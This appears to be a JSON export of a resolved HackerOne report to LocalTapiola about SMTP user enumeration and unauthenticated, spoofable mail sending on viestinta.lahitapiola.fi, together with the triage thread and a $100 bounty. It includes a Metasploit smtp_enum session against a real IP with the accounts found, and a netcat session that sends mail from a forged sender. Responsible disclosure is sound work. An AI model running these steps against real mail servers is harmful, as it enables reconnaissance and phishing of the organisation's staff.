{"id":183548,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODM1NDg=","url":"https://hackerone.com/reports/183548","title":"SMTP configuration vulnerability viestinta.lahitapiola.fi","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2016-11-20T02:12:45.186Z","submitted_at":"2016-11-20T02:12:45.186Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"rnmx","url":"/rnmx","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8416,"url":"https://hackerone.com/localtapiola","handle":"localtapiola","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"LocalTapiola","twitter_handle":"","website":"http://www.lahitapiola.fi","about":"LocalTapiolaâ€™s products and services cover non-life, life and pension insurance, as well as investment and saving services."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-03-18T07:19:33.650Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-02-16T07:19:25.590Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello guys,\n\nI have two related SMTP vulnerabilities. I decided to put both of them under the same ticket because they are closely related.\n\n**Summary:**\nI discovered two SMTP vulnerabilities on host viestinta.lahitapiola.fi. First it is possible to perform user enumeration. For this you can use metasploit in following way:\n\n`msf \u003e use auxiliary/scanner/smtp/smtp_enum\nmsf auxiliary(smtp_enum) \u003e set RHOSTS 83.150.127.170\nRHOSTS =\u003e 83.150.127.170\nmsf auxiliary(smtp_enum) \u003e run\n[*] 83.150.127.170:25 Banner: 220 viestinta.tapiola.fi ESMTP Postfix\n[+] 83.150.127.170:25 Users found: , adm, bin, daemon, fax, ftp, games, gdm, gopher, halt, lp, mail, news, nobody, operator, postgres, postmaster, sshd, sync, uucp, webmaster, www\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed`\n\nWith this step we recovered valid users on the system (please note I used the default dictionary which comes with metasploit, I did not attempt to create wordlist which would discover your personal email addresses, to limit number of brute force guesses).\n\nSecond vulnerability is the fact an attacker without any authentication can send emails from this SMTP. Email are limited to \"@viestinta.lahitapiola.fi\" only. To reproduce you can use NetCat utility:\n\n`root@kali:~/Android/Sdk/tools# nc -nvv 83.150.127.170 25\n(UNKNOWN) [83.150.127.170] 25 (smtp) open\n220 viestinta.tapiola.fi ESMTP Postfix\nHELO 83.150.127.170\n250 viestinta.tapiola.fi\nMAIL FROM:\u003chacker@viestinta.tapiola.fi\u003e\n250 2.1.0 Ok\nRCPT TO:\u003chacker@viestinta.tapiola.fi\u003e\n550 5.1.1 \u003chacker@viestinta.tapiola.fi\u003e: Recipient address rejected: User unknown in local recipient table\nRCPT TO:\u003cadmin@viestinta.tapiola.fi\u003e\n550 5.1.1 \u003cadmin@viestinta.tapiola.fi\u003e: Recipient address rejected: User unknown in local recipient table\nRCPT TO:\u003cadm@viestinta.tapiola.fi\u003e\n250 2.1.5 Ok\nDATA\n354 End data with \u003cCR\u003e\u003cLF\u003e.\u003cCR\u003e\u003cLF\u003e\ntest\n.\n250 2.0.0 Ok: queued as 98F9E3F201A1\n421 4.4.2 viestinta.tapiola.fi Error: timeout exceeded\n sent 211, rcvd 481`\n\nIn NetCat session above you can see I used fake email address hacker@viestinta.tapiola.fi to send email to adm@viestinta.tapiola.fi (we discovered this is valid target in step one - user enumeration). You can see the difference when I tried to send an email to address which does not exist \"\u003chacker@viestinta.tapiola.fi\u003e: Recipient address rejected: User unknown in local recipient table\".\n\nFrom my point of view there are a few problems:\n1. Information leakage (in step one attacker can get valid system accounts/emails). Those details can be used during later phase of attack (probably low impact)\n2. An attacker could use this to spam internal users, maybe DoS (low risk)\n3. An attacker could use this to launch very efficient phishing campaign. As I already stated it is possible to send email from any address, so attacker could pick something trusted like administrator@ or it-support@ , etc. Then there is a higher chance unsuspecting employee would click malicious URL/executable in the email (probably medium risk)\n\n\n**Domain:** viestinta.tapiola.fi\n\n## Browsers / Apps Verified In: n/a - infrastruture problem\n\n## Steps To Reproduce: Provided in summary section.\n\n## Related reports, best practices\n\nhttps://pentestlab.wordpress.com/2012/11/20/smtp-user-enumeration/ - about SMTP user enumeration","vulnerability_information_html":"\u003cp\u003eHello guys,\u003c/p\u003e\n\n\u003cp\u003eI have two related SMTP vulnerabilities. I decided to put both of them under the same ticket because they are closely related.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e\u003cbr\u003e\nI discovered two SMTP vulnerabilities on host viestinta.lahitapiola.fi. First it is possible to perform user enumeration. For this you can use metasploit in following way:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003emsf \u0026gt; use auxiliary/scanner/smtp/smtp_enum\u003cbr\u003e\nmsf auxiliary(smtp_enum) \u0026gt; set RHOSTS 83.150.127.170\u003cbr\u003e\nRHOSTS =\u0026gt; 83.150.127.170\u003cbr\u003e\nmsf auxiliary(smtp_enum) \u0026gt; run\u003cbr\u003e\n[*] 83.150.127.170:25 Banner: 220 viestinta.tapiola.fi ESMTP Postfix\u003cbr\u003e\n[+] 83.150.127.170:25 Users found: , adm, bin, daemon, fax, ftp, games, gdm, gopher, halt, lp, mail, news, nobody, operator, postgres, postmaster, sshd, sync, uucp, webmaster, www\u003cbr\u003e\n[*] Scanned 1 of 1 hosts (100% complete)\u003cbr\u003e\n[*] Auxiliary module execution completed\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eWith this step we recovered valid users on the system (please note I used the default dictionary which comes with metasploit, I did not attempt to create wordlist which would discover your personal email addresses, to limit number of brute force guesses).\u003c/p\u003e\n\n\u003cp\u003eSecond vulnerability is the fact an attacker without any authentication can send emails from this SMTP. Email are limited to \u0026quot;@viestinta.lahitapiola.fi\u0026quot; only. To reproduce you can use NetCat utility:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003eroot@kali:~/Android/Sdk/tools# nc -nvv 83.150.127.170 25\u003cbr\u003e\n(UNKNOWN) [83.150.127.170] 25 (smtp) open\u003cbr\u003e\n220 viestinta.tapiola.fi ESMTP Postfix\u003cbr\u003e\nHELO 83.150.127.170\u003cbr\u003e\n250 viestinta.tapiola.fi\u003cbr\u003e\nMAIL FROM:\u0026lt;hacker@viestinta.tapiola.fi\u0026gt;\u003cbr\u003e\n250 2.1.0 Ok\u003cbr\u003e\nRCPT TO:\u0026lt;hacker@viestinta.tapiola.fi\u0026gt;\u003cbr\u003e\n550 5.1.1 \u0026lt;hacker@viestinta.tapiola.fi\u0026gt;: Recipient address rejected: User unknown in local recipient table\u003cbr\u003e\nRCPT TO:\u0026lt;admin@viestinta.tapiola.fi\u0026gt;\u003cbr\u003e\n550 5.1.1 \u0026lt;admin@viestinta.tapiola.fi\u0026gt;: Recipient address rejected: User unknown in local recipient table\u003cbr\u003e\nRCPT TO:\u0026lt;adm@viestinta.tapiola.fi\u0026gt;\u003cbr\u003e\n250 2.1.5 Ok\u003cbr\u003e\nDATA\u003cbr\u003e\n354 End data with \u0026lt;CR\u0026gt;\u0026lt;LF\u0026gt;.\u0026lt;CR\u0026gt;\u0026lt;LF\u0026gt;\u003cbr\u003e\ntest\u003cbr\u003e\n.\u003cbr\u003e\n250 2.0.0 Ok: queued as 98F9E3F201A1\u003cbr\u003e\n421 4.4.2 viestinta.tapiola.fi Error: timeout exceeded\u003cbr\u003e\n sent 211, rcvd 481\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eIn NetCat session above you can see I used fake email address \u003ca title=\"hacker@viestinta.tapiola.fi\" href=\"mailto:hacker@viestinta.tapiola.fi\" rel=\"nofollow noopener noreferrer\"\u003ehacker@viestinta.tapiola.fi\u003c/a\u003e to send email to \u003ca title=\"adm@viestinta.tapiola.fi\" href=\"mailto:adm@viestinta.tapiola.fi\" rel=\"nofollow noopener noreferrer\"\u003eadm@viestinta.tapiola.fi\u003c/a\u003e (we discovered this is valid target in step one - user enumeration). You can see the difference when I tried to send an email to address which does not exist \u0026quot;\u003ca title=\"hacker@viestinta.tapiola.fi\" href=\"mailto:hacker@viestinta.tapiola.fi\" rel=\"nofollow noopener noreferrer\"\u003ehacker@viestinta.tapiola.fi\u003c/a\u003e: Recipient address rejected: User unknown in local recipient table\u0026quot;.\u003c/p\u003e\n\n\u003cp\u003eFrom my point of view there are a few problems:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eInformation leakage (in step one attacker can get valid system accounts/emails). Those details can be used during later phase of attack (probably low impact)\u003c/li\u003e\n\u003cli\u003eAn attacker could use this to spam internal users, maybe DoS (low risk)\u003c/li\u003e\n\u003cli\u003eAn attacker could use this to launch very efficient phishing campaign. As I already stated it is possible to send email from any address, so attacker could pick something trusted like administrator@ or it-support@ , etc. Then there is a higher chance unsuspecting employee would click malicious URL/executable in the email (probably medium risk)\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e\u003cstrong\u003eDomain:\u003c/strong\u003e viestinta.tapiola.fi\u003c/p\u003e\n\n\u003ch2 id=\"browsers-apps-verified-in-n-a-infrastruture-problem\"\u003eBrowsers / Apps Verified In: n/a - infrastruture problem\u003c/h2\u003e\n\n\u003ch2 id=\"steps-to-reproduce-provided-in-summary-section\"\u003eSteps To Reproduce: Provided in summary section.\u003c/h2\u003e\n\n\u003ch2 id=\"related-reports-best-practices\"\u003eRelated reports, best practices\u003c/h2\u003e\n\n\u003cp\u003e\u003ca title=\"https://pentestlab.wordpress.com/2012/11/20/smtp-user-enumeration/\" href=\"/redirect?url=https%3A%2F%2Fpentestlab.wordpress.com%2F2012%2F11%2F20%2Fsmtp-user-enumeration%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://pentestlab.wordpress.com/2012/11/20/smtp-user-enumeration/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e - about SMTP user enumeration\u003c/p\u003e\n","bounty_amount":"100.0","formatted_bounty":"$100","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-03-18T07:19:25.622Z","allow_singular_disclosure_after":-119395623.70534939,"singular_disclosure_allowed":true,"vote_count":8,"voters":["delimitry","ankitsingh","mpz","eveeez","spetr0x","klau5","gadmium","thallesisnipe"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1308688,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 7 days, but usually much faster. Bounty decisions are made 1-2 times per month, so please have patience.","markdown_message":"\u003cp\u003eThanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.\u003c/p\u003e\n\n\u003cp\u003eOur security team will take a look at this issue as soon as possible. We will reply to your report within 7 days, but usually much faster. Bounty decisions are made 1-2 times per month, so please have patience.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-20T11:16:54.700Z","updated_at":"2016-11-20T11:16:54.700Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1430323,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello there, any update?\n\nThank you","markdown_message":"\u003cp\u003eHello there, any update?\u003c/p\u003e\n\n\u003cp\u003eThank you\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-19T15:25:47.327Z","updated_at":"2017-01-19T15:25:47.327Z","actor":{"username":"rnmx","cleared":false,"url":"/rnmx","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1431104,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, well not really. Some small steps have been taken, but not there yet. We are looking into the next steps on monday, and then request changes. Realistically we are looking at 2-3 weeks.","markdown_message":"\u003cp\u003eHi, well not really. Some small steps have been taken, but not there yet. We are looking into the next steps on monday, and then request changes. Realistically we are looking at 2-3 weeks.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-19T20:14:55.585Z","updated_at":"2017-01-19T20:15:04.438Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1451822,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Oki, perfect. If there is anything I could help you with (advice, retest, etc.) just let me know.","markdown_message":"\u003cp\u003eOki, perfect. If there is anything I could help you with (advice, retest, etc.) just let me know.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-30T17:06:19.590Z","updated_at":"2017-01-30T17:06:19.590Z","actor":{"username":"rnmx","cleared":false,"url":"/rnmx","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1461122,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"We would like to award you with a bounty.","markdown_message":"\u003cp\u003eWe would like to award you with a bounty.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-03T16:03:22.075Z","updated_at":"2017-02-03T16:03:22.075Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"LocalTapiola"}},"bounty_amount":"100.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"localtapiola","collaborator":{"username":"rnmx","url":"/rnmx"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1481025,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for bounty!","markdown_message":"\u003cp\u003eThank you for bounty!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-12T18:53:31.590Z","updated_at":"2017-02-12T18:53:31.590Z","actor":{"username":"rnmx","cleared":false,"url":"/rnmx","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1486778,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"OK with public disclosure?","markdown_message":"\u003cp\u003eOK with public disclosure?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-15T10:20:56.571Z","updated_at":"2017-02-15T10:20:56.571Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"rnmx","url":"/rnmx"},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1488727,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Public disclosure.","markdown_message":"\u003cp\u003ePublic disclosure.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-16T07:19:25.603Z","updated_at":"2017-02-16T07:19:25.603Z","first_to_agree":true,"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1549310,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-18T07:19:33.669Z","updated_at":"2017-03-18T07:19:33.669Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"LocalTapiola"}},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":3376,"category":"team","content":"##Issue\n\nThe reporter found a few misconfigurations in one smtp-server related to the viestinta.lahitapiola.fi domain. \n\n##Fix\n\nSome configuration changes were made to the smtp-service.\n\n##Reasoning\n\nThe issues reported were investigated thoroughly. The service has underlying controls which make misuses in the way the dreport describes almost impossible. Only default users could be enumerated - and only these users existed - a few of them according to RFC standards. A few corrections were made to the configurations, hence a small bounty was awarded although the smtp-servers are way out of our scope.\n\n*Please note that the configuration as it is now is fully according to business needs and risk posture. We will not accept reports on these same issues, although there are things in this report we did not fully (want to) fix.*\n","can_view?":true,"can_edit?":false,"content_html":"\u003ch2 id=\"issue\"\u003eIssue\u003c/h2\u003e\n\n\u003cp\u003eThe reporter found a few misconfigurations in one smtp-server related to the viestinta.lahitapiola.fi domain. \u003c/p\u003e\n\n\u003ch2 id=\"fix\"\u003eFix\u003c/h2\u003e\n\n\u003cp\u003eSome configuration changes were made to the smtp-service.\u003c/p\u003e\n\n\u003ch2 id=\"reasoning\"\u003eReasoning\u003c/h2\u003e\n\n\u003cp\u003eThe issues reported were investigated thoroughly. The service has underlying controls which make misuses in the way the dreport describes almost impossible. Only default users could be enumerated - and only these users existed - a few of them according to RFC standards. A few corrections were made to the configurations, hence a small bounty was awarded although the smtp-servers are way out of our scope.\u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003ePlease note that the configuration as it is now is fully according to business needs and risk posture. We will not accept reports on these same issues, although there are things in this report we did not fully (want to) fix.\u003c/em\u003e\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}